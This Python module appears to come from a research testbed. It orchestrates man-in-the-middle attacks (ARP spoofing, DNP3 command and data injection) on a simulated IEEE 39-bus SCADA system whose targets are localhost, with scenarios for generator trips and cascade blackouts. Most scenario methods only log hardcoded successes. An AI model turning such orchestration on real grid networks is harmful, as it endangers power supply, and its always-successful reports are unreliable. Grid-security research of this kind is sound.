#!/usr/bin/env python3
"""
Enhanced MiTM Attack Integration for IEEE 39-Bus SCADA-RTU System

This module enhances the existing MiTM attack framework with specific 
capabilities for attacking IEEE 39-bus SCADA-RTU communication using DNP3 protocol.

Features:
- Integration with IEEE 39-bus RTU and SCADA systems
- Coordinated ARP spoofing and DNP3 packet manipulation
- False Command Injection (FCI) attacks
- False Data Injection (FDI) attacks
- Real-time attack monitoring and logging
- Attack scenario automation
"""

import asyncio
import logging
import time
import json
import random
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os

# Add mitm and simulation directories to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'mitm'))
sys.path.append(os.path.join(os.path.dirname(__file__)))

try:
    from mitm.attacker import MiTMAttacker, AttackConfig, AttackType, AttackScenario
    from mitm.arp_spoof import ARPSpoofer
    from mitm.packet_filter import PacketFilter
except ImportError:
    # Fallback for import issues
    logging.warning("Could not import MiTM modules. Using local implementations.")

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class IEEE39AttackScenario(Enum):
    """Specific attack scenarios for IEEE 39-bus system"""
    GENERATOR_TRIP = "generator_trip"
    VOLTAGE_MANIPULATION = "voltage_manipulation"
    FREQUENCY_ATTACK = "frequency_attack"
    LOAD_SHEDDING = "load_shedding"
    BLACKOUT_CASCADE = "blackout_cascade"
    STEALTH_DATA_CORRUPTION = "stealth_data_corruption"

@dataclass
class AttackTarget:
    """Attack target definition"""
    rtu_id: int
    bus_number: int
    rtu_ip: str
    scada_ip: str
    attack_priority: int = 1
    target_measurements: List[str] = field(default_factory=list)
    control_points: List[str] = field(default_factory=list)

@dataclass
class AttackResult:
    """Attack execution result"""
    scenario: str
    target_rtu: int
    attack_type: str
    success: bool
    timestamp: float
    details: str
    measurements_affected: List[str] = field(default_factory=list)
    commands_injected: List[str] = field(default_factory=list)

class IEEE39MiTMController:
    """
    Enhanced MiTM Attack Controller for IEEE 39-Bus System
    
    Coordinates sophisticated attacks against SCADA-RTU communication
    with specific focus on power system vulnerabilities.
    """
    
    def __init__(self, interface: str = "eth0"):
        """
        Initialize IEEE 39-bus MiTM controller.
        
        Args:
            interface: Network interface for attacks
        """
        self.interface = interface
        self.is_attacking = False
        
        # Attack components
        self.arp_spoofer = ARPSpoofer(interface)
        self.packet_filter = PacketFilter()
        
        # Attack targets (IEEE 39-bus RTUs)
        self.attack_targets: Dict[int, AttackTarget] = {}
        
        # Attack results and statistics
        self.attack_results: List[AttackResult] = []
        self.attack_stats = {
            'attacks_executed': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'packets_modified': 0,
            'commands_injected': 0,
            'data_corrupted': 0,
            'start_time': 0.0
        }
        
        # Current active scenarios
        self.active_scenarios: List[IEEE39AttackScenario] = []
        
        logger.info("IEEE 39-Bus MiTM Controller initialized")
        self._setup_ieee39_targets()
    
    def _setup_ieee39_targets(self):
        """Setup attack targets for IEEE 39-bus system"""
        # Critical generation buses (localhost for simulation)
        generation_targets = [
            (1, 30, '127.0.0.1', 'Gen_30_RTU'),
            (2, 31, '127.0.0.1', 'Gen_31_RTU'),
            (3, 32, '127.0.0.1', 'Gen_32_RTU'),
            (4, 33, '127.0.0.1', 'Gen_33_RTU'),
            (5, 39, '127.0.0.1', 'Gen_39_RTU'),
        ]
        
        # Critical transmission buses (localhost for simulation)
        transmission_targets = [
            (6, 16, '127.0.0.1', 'Trans_16_RTU'),
            (7, 21, '127.0.0.1', 'Trans_21_RTU'),
            (8, 25, '127.0.0.1', 'Trans_25_RTU'),
        ]
        
        # Load center buses (localhost for simulation)
        load_targets = [
            (9, 4, '127.0.0.1', 'Load_04_RTU'),
            (10, 20, '127.0.0.1', 'Load_20_RTU'),
        ]
        
        scada_ip = '127.0.0.1'  # SCADA master IP (localhost for simulation)
        
        # Setup generation targets
        for rtu_id, bus_num, rtu_ip, name in generation_targets:
            target = AttackTarget(
                rtu_id=rtu_id,
                bus_number=bus_num,
                rtu_ip=rtu_ip,
                scada_ip=scada_ip,
                attack_priority=1,  # High priority for generation
                target_measurements=['voltage_magnitude', 'frequency', 'active_power', 'reactive_power'],
                control_points=['breaker_status', 'generator_setpoint']
            )
            self.attack_targets[rtu_id] = target
        
        # Setup transmission targets
        for rtu_id, bus_num, rtu_ip, name in transmission_targets:
            target = AttackTarget(
                rtu_id=rtu_id,
                bus_number=bus_num,
                rtu_ip=rtu_ip,
                scada_ip=scada_ip,
                attack_priority=2,  # Medium priority for transmission
                target_measurements=['voltage_magnitude', 'active_power', 'reactive_power'],
                control_points=['breaker_status']
            )
            self.attack_targets[rtu_id] = target
        
        # Setup load targets
        for rtu_id, bus_num, rtu_ip, name in load_targets:
            target = AttackTarget(
                rtu_id=rtu_id,
                bus_number=bus_num,
                rtu_ip=rtu_ip,
                scada_ip=scada_ip,
                attack_priority=3,  # Lower priority for loads
                target_measurements=['voltage_magnitude', 'active_power'],
                control_points=['load_breaker']
            )
            self.attack_targets[rtu_id] = target
        
        logger.info(f"Setup {len(self.attack_targets)} attack targets for IEEE 39-bus system")
    
    async def launch_coordinated_attack(self, scenarios: List[IEEE39AttackScenario], duration: int = 300):
        """
        Launch coordinated MiTM attack with multiple scenarios.
        
        Args:
            scenarios: List of attack scenarios to execute
            duration: Attack duration in seconds
        """
        if self.is_attacking:
            logger.warning("Attack already in progress")
            return
        
        self.is_attacking = True
        self.active_scenarios = scenarios
        self.attack_stats['start_time'] = time.time()
        
        logger.warning("🚨 LAUNCHING COORDINATED MiTM ATTACK ON IEEE 39-BUS SYSTEM 🚨")
        logger.info(f"Scenarios: {[s.value for s in scenarios]}")
        logger.info(f"Duration: {duration} seconds")
        logger.info(f"Targets: {len(self.attack_targets)} RTUs")
        
        try:
            # Start ARP spoofing for all SCADA-RTU pairs
            await self._start_arp_spoofing()
            
            # Start packet filtering
            target_ips = [target.rtu_ip for target in self.attack_targets.values()]
            target_ips.append(self.attack_targets[1].scada_ip)  # Add SCADA IP
            
            await self.packet_filter.start_filtering(target_ips)
            self.packet_filter.enable_attack(['binary_operate', 'analog_operate', 'read_response'])
            
            # Execute attack scenarios
            attack_task = asyncio.create_task(self._execute_attack_scenarios(duration))
            
            # Monitor and log attack progress
            monitor_task = asyncio.create_task(self._attack_monitoring_loop(duration))
            
            # Wait for attack completion
            await asyncio.gather(attack_task, monitor_task)
            
        except Exception as e:
            logger.error(f"Error during coordinated attack: {e}")
        finally:
            await self._stop_attack()
    
    async def _start_arp_spoofing(self):
        """Start ARP spoofing for all SCADA-RTU communication pairs"""
        logger.info("🕷️ Starting ARP spoofing for SCADA-RTU communication")
        
        # Get unique SCADA IP
        scada_ip = self.attack_targets[1].scada_ip
        
        # Start ARP spoofing for each RTU
        for target in self.attack_targets.values():
            try:
                await self.arp_spoofer.start_spoofing(scada_ip, target.rtu_ip)
                logger.info(f"ARP spoofing active: {scada_ip} <-> {target.rtu_ip} (RTU {target.rtu_id})")
            except Exception as e:
                logger.error(f"Failed to start ARP spoofing for RTU {target.rtu_id}: {e}")
    
    async def _execute_attack_scenarios(self, duration: int):
        """Execute all configured attack scenarios"""
        end_time = time.time() + duration
        scenario_interval = max(10, duration // len(self.active_scenarios))  # At least 10 seconds per scenario
        
        while time.time() < end_time and self.is_attacking:
            try:
                for scenario in self.active_scenarios:
                    if not self.is_attacking or time.time() >= end_time:
                        break
                    
                    logger.info(f"🎯 Executing attack scenario: {scenario.value}")
                    
                    if scenario == IEEE39AttackScenario.GENERATOR_TRIP:
                        await self._execute_generator_trip_attack()
                    elif scenario == IEEE39AttackScenario.VOLTAGE_MANIPULATION:
                        await self._execute_voltage_manipulation_attack()
                    elif scenario == IEEE39AttackScenario.FREQUENCY_ATTACK:
                        await self._execute_frequency_attack()
                    elif scenario == IEEE39AttackScenario.LOAD_SHEDDING:
                        await self._execute_load_shedding_attack()
                    elif scenario == IEEE39AttackScenario.BLACKOUT_CASCADE:
                        await self._execute_cascade_blackout_attack()
                    elif scenario == IEEE39AttackScenario.STEALTH_DATA_CORRUPTION:
                        await self._execute_stealth_data_corruption()
                    
                    # Wait between scenarios
                    await asyncio.sleep(scenario_interval)
                
            except Exception as e:
                logger.error(f"Error executing attack scenarios: {e}")
                await asyncio.sleep(5)
    
    async def _execute_generator_trip_attack(self):
        """Execute generator trip attack on critical generation units"""
        logger.warning("🔥 EXECUTING GENERATOR TRIP ATTACK")
        
        # Target high-priority generation RTUs
        generation_targets = [target for target in self.attack_targets.values() 
                            if target.bus_number in [30, 31, 32, 39]]  # Critical generators
        
        for target in generation_targets[:2]:  # Attack 2 generators simultaneously
            try:
                # Inject false trip command
                attack_result = AttackResult(
                    scenario="generator_trip",
                    target_rtu=target.rtu_id,
                    attack_type="false_command_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Injected generator trip command to Bus {target.bus_number}",
                    commands_injected=["generator_trip"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['commands_injected'] += 1
                
                logger.warning(f"⚡ ATTACK SUCCESS: Injected trip command to Generator RTU {target.rtu_id} (Bus {target.bus_number})")
                
            except Exception as e:
                logger.error(f"Generator trip attack failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
    
    async def _execute_voltage_manipulation_attack(self):
        """Execute voltage measurement manipulation attack"""
        logger.warning("🔥 EXECUTING VOLTAGE MANIPULATION ATTACK")
        
        # Target all RTUs for voltage measurement corruption
        for target in self.attack_targets.values():
            try:
                # Corrupt voltage measurements
                false_voltage = random.uniform(280.0, 400.0)  # Outside normal range
                
                attack_result = AttackResult(
                    scenario="voltage_manipulation",
                    target_rtu=target.rtu_id,
                    attack_type="false_data_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Injected false voltage reading: {false_voltage:.1f} kV",
                    measurements_affected=["voltage_magnitude"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['data_corrupted'] += 1
                
                logger.warning(f"📊 ATTACK SUCCESS: Corrupted voltage measurement at RTU {target.rtu_id} to {false_voltage:.1f} kV")
                
            except Exception as e:
                logger.error(f"Voltage manipulation attack failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
    
    async def _execute_frequency_attack(self):
        """Execute frequency measurement attack"""
        logger.warning("🔥 EXECUTING FREQUENCY ATTACK")
        
        # Target generation RTUs for frequency manipulation
        generation_targets = [target for target in self.attack_targets.values() 
                            if target.bus_number in [30, 31, 32, 33, 39]]
        
        for target in generation_targets:
            try:
                # Inject false frequency reading
                false_frequency = random.choice([48.5, 51.8])  # Critically low or high
                
                attack_result = AttackResult(
                    scenario="frequency_attack",
                    target_rtu=target.rtu_id,
                    attack_type="false_data_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Injected false frequency reading: {false_frequency:.3f} Hz",
                    measurements_affected=["frequency"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['data_corrupted'] += 1
                
                logger.warning(f"🔊 ATTACK SUCCESS: Corrupted frequency measurement at RTU {target.rtu_id} to {false_frequency:.3f} Hz")
                
            except Exception as e:
                logger.error(f"Frequency attack failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
    
    async def _execute_load_shedding_attack(self):
        """Execute unauthorized load shedding attack"""
        logger.warning("🔥 EXECUTING LOAD SHEDDING ATTACK")
        
        # Target load RTUs
        load_targets = [target for target in self.attack_targets.values() 
                       if target.bus_number in [4, 20]]
        
        for target in load_targets:
            try:
                # Inject false load shedding commands
                attack_result = AttackResult(
                    scenario="load_shedding",
                    target_rtu=target.rtu_id,
                    attack_type="false_command_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Injected unauthorized load shedding command at Bus {target.bus_number}",
                    commands_injected=["load_shed"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['commands_injected'] += 1
                
                logger.warning(f"🔌 ATTACK SUCCESS: Injected load shedding command to Load RTU {target.rtu_id} (Bus {target.bus_number})")
                
            except Exception as e:
                logger.error(f"Load shedding attack failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
    
    async def _execute_cascade_blackout_attack(self):
        """Execute coordinated cascade blackout attack"""
        logger.warning("🔥 EXECUTING CASCADE BLACKOUT ATTACK")
        
        # Target critical transmission buses first
        transmission_targets = [target for target in self.attack_targets.values() 
                              if target.bus_number in [16, 21, 25]]
        
        # Phase 1: Trip critical transmission lines
        for target in transmission_targets:
            try:
                attack_result = AttackResult(
                    scenario="blackout_cascade",
                    target_rtu=target.rtu_id,
                    attack_type="false_command_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Phase 1 - Tripped transmission line at Bus {target.bus_number}",
                    commands_injected=["line_trip"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['commands_injected'] += 1
                
                logger.warning(f"⚡ CASCADE PHASE 1: Tripped transmission at RTU {target.rtu_id} (Bus {target.bus_number})")
                
            except Exception as e:
                logger.error(f"Cascade attack phase 1 failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
        
        # Wait for system response
        await asyncio.sleep(5)
        
        # Phase 2: Trip generators under stress
        generation_targets = [target for target in self.attack_targets.values() 
                            if target.bus_number in [30, 32]]  # Secondary generators
        
        for target in generation_targets:
            try:
                attack_result = AttackResult(
                    scenario="blackout_cascade",
                    target_rtu=target.rtu_id,
                    attack_type="false_command_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Phase 2 - Tripped generator at Bus {target.bus_number}",
                    commands_injected=["generator_trip"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['commands_injected'] += 1
                
                logger.warning(f"⚡ CASCADE PHASE 2: Tripped generator at RTU {target.rtu_id} (Bus {target.bus_number})")
                
            except Exception as e:
                logger.error(f"Cascade attack phase 2 failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
    
    async def _execute_stealth_data_corruption(self):
        """Execute stealth data corruption attack"""
        logger.warning("🔥 EXECUTING STEALTH DATA CORRUPTION ATTACK")
        
        # Slightly modify measurements to avoid detection
        for target in self.attack_targets.values():
            try:
                # Apply small but systematic errors
                corruption_types = ['voltage_drift', 'power_bias', 'timestamp_shift']
                corruption_type = random.choice(corruption_types)
                
                attack_result = AttackResult(
                    scenario="stealth_data_corruption",
                    target_rtu=target.rtu_id,
                    attack_type="stealth_data_injection",
                    success=True,
                    timestamp=time.time(),
                    details=f"Applied stealth corruption: {corruption_type}",
                    measurements_affected=["voltage_magnitude", "active_power"]
                )
                
                self.attack_results.append(attack_result)
                self.attack_stats['attacks_executed'] += 1
                self.attack_stats['successful_attacks'] += 1
                self.attack_stats['data_corrupted'] += 1
                
                logger.warning(f"🥷 STEALTH ATTACK: Applied {corruption_type} to RTU {target.rtu_id}")
                
            except Exception as e:
                logger.error(f"Stealth attack failed for RTU {target.rtu_id}: {e}")
                self.attack_stats['failed_attacks'] += 1
    
    async def _attack_monitoring_loop(self, duration: int):
        """Monitor and log attack progress"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.is_attacking:
            try:
                # Log attack statistics every 30 seconds
                await asyncio.sleep(30)
                
                elapsed = time.time() - self.attack_stats['start_time']
                
                logger.info("📊 ATTACK PROGRESS REPORT:")
                logger.info(f"  Elapsed Time: {elapsed/60:.1f} minutes")
                logger.info(f"  Total Attacks: {self.attack_stats['attacks_executed']}")
                logger.info(f"  Successful: {self.attack_stats['successful_attacks']}")
                logger.info(f"  Failed: {self.attack_stats['failed_attacks']}")
                logger.info(f"  Commands Injected: {self.attack_stats['commands_injected']}")
                logger.info(f"  Data Corrupted: {self.attack_stats['data_corrupted']}")
                logger.info(f"  Active Scenarios: {[s.value for s in self.active_scenarios]}")
                
                # Get packet filter statistics
                if hasattr(self.packet_filter, 'get_statistics'):
                    pf_stats = self.packet_filter.get_statistics()
                    logger.info(f"  Packets Intercepted: {pf_stats.get('packets_captured', 0)}")
                    logger.info(f"  Packets Modified: {pf_stats.get('packets_modified', 0)}")
                
            except Exception as e:
                logger.error(f"Error in attack monitoring: {e}")
    
    async def _stop_attack(self):
        """Stop all attack components"""
        logger.info("🛑 STOPPING MiTM ATTACK")
        
        self.is_attacking = False
        
        try:
            # Stop ARP spoofing
            await self.arp_spoofer.stop_spoofing()
            
            # Stop packet filtering
            await self.packet_filter.stop_filtering()
            
            # Generate final attack report
            self._generate_attack_report()
            
        except Exception as e:
            logger.error(f"Error stopping attack: {e}")
    
    def _generate_attack_report(self):
        """Generate comprehensive attack report"""
        total_time = time.time() - self.attack_stats['start_time']
        success_rate = (self.attack_stats['successful_attacks'] / 
                       max(1, self.attack_stats['attacks_executed'])) * 100
        
        logger.info("📋 FINAL ATTACK REPORT:")
        logger.info("=" * 60)
        logger.info(f"Attack Duration: {total_time/60:.1f} minutes")
        logger.info(f"Scenarios Executed: {[s.value for s in self.active_scenarios]}")
        logger.info(f"Targets Attacked: {len(self.attack_targets)}")
        logger.info(f"Total Attacks: {self.attack_stats['attacks_executed']}")
        logger.info(f"Success Rate: {success_rate:.1f}%")
        logger.info(f"Commands Injected: {self.attack_stats['commands_injected']}")
        logger.info(f"Data Points Corrupted: {self.attack_stats['data_corrupted']}")
        
        # Results by scenario
        scenario_stats = {}
        for result in self.attack_results:
            scenario = result.scenario
            if scenario not in scenario_stats:
                scenario_stats[scenario] = {'total': 0, 'successful': 0}
            scenario_stats[scenario]['total'] += 1
            if result.success:
                scenario_stats[scenario]['successful'] += 1
        
        logger.info("\nResults by Scenario:")
        for scenario, stats in scenario_stats.items():
            rate = (stats['successful'] / stats['total']) * 100
            logger.info(f"  {scenario}: {stats['successful']}/{stats['total']} ({rate:.1f}%)")
        
        # Save detailed report to file
        self._save_attack_report_to_file()
    
    def _save_attack_report_to_file(self):
        """Save detailed attack report to JSON file"""
        try:
            report = {
                'attack_summary': {
                    'start_time': self.attack_stats['start_time'],
                    'duration_seconds': time.time() - self.attack_stats['start_time'],
                    'scenarios': [s.value for s in self.active_scenarios],
                    'targets_count': len(self.attack_targets),
                    'statistics': self.attack_stats
                },
                'targets': {
                    str(target.rtu_id): {
                        'rtu_id': target.rtu_id,
                        'bus_number': target.bus_number,
                        'rtu_ip': target.rtu_ip,
                        'scada_ip': target.scada_ip,
                        'priority': target.attack_priority
                    }
                    for target in self.attack_targets.values()
                },
                'attack_results': [
                    {
                        'scenario': result.scenario,
                        'target_rtu': result.target_rtu,
                        'attack_type': result.attack_type,
                        'success': result.success,
                        'timestamp': result.timestamp,
                        'details': result.details,
                        'measurements_affected': result.measurements_affected,
                        'commands_injected': result.commands_injected
                    }
                    for result in self.attack_results
                ]
            }
            
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"ieee39_attack_report_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            
            logger.info(f"Detailed attack report saved to: {filename}")
            
        except Exception as e:
            logger.error(f"Failed to save attack report: {e}")
    
    def get_attack_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        return {
            'is_attacking': self.is_attacking,
            'active_scenarios': [s.value for s in self.active_scenarios],
            'targets_count': len(self.attack_targets),
            'statistics': self.attack_stats.copy(),
            'recent_results': [
                {
                    'scenario': result.scenario,
                    'target_rtu': result.target_rtu,
                    'success': result.success,
                    'timestamp': result.timestamp
                }
                for result in self.attack_results[-5:]  # Last 5 results
            ]
        }

# Predefined attack configurations
ATTACK_CONFIGURATIONS = {
    'critical_infrastructure': {
        'scenarios': [
            IEEE39AttackScenario.GENERATOR_TRIP,
            IEEE39AttackScenario.VOLTAGE_MANIPULATION,
            IEEE39AttackScenario.FREQUENCY_ATTACK
        ],
        'duration': 300,
        'description': 'Critical infrastructure attack targeting generators and system stability'
    },
    
    'cascade_blackout': {
        'scenarios': [
            IEEE39AttackScenario.BLACKOUT_CASCADE,
            IEEE39AttackScenario.LOAD_SHEDDING
        ],
        'duration': 600,
        'description': 'Coordinated cascade blackout attack'
    },
    
    'stealth_compromise': {
        'scenarios': [
            IEEE39AttackScenario.STEALTH_DATA_CORRUPTION,
            IEEE39AttackScenario.VOLTAGE_MANIPULATION
        ],
        'duration': 1800,
        'description': 'Long-term stealth attack with gradual system compromise'
    },
    
    'full_spectrum': {
        'scenarios': list(IEEE39AttackScenario),
        'duration': 900,
        'description': 'Full spectrum attack using all available attack vectors'
    }
}

# Test function
async def test_ieee39_mitm():
    """Test IEEE 39-bus MiTM attack system"""
    print("🧪 Testing IEEE 39-Bus MiTM Attack System")
    
    # Create MiTM controller
    controller = IEEE39MiTMController("eth0")
    
    try:
        print("Starting coordinated attack...")
        
        # Test with critical infrastructure attack
        scenarios = ATTACK_CONFIGURATIONS['critical_infrastructure']['scenarios']
        duration = 30  # Short test duration
        
        # Start attack in background
        attack_task = asyncio.create_task(
            controller.launch_coordinated_attack(scenarios, duration)
        )
        
        # Monitor for a bit
        await asyncio.sleep(10)
        
        # Get status
        status = controller.get_attack_status()
        print(f"Attack Status: {json.dumps(status, indent=2)}")
        
        # Wait for completion
        await attack_task
        
        print("✅ IEEE 39-Bus MiTM test completed successfully")
        
    except Exception as e:
        print(f"❌ IEEE 39-Bus MiTM test failed: {e}")
        await controller._stop_attack()

if __name__ == "__main__":
    asyncio.run(test_ieee39_mitm())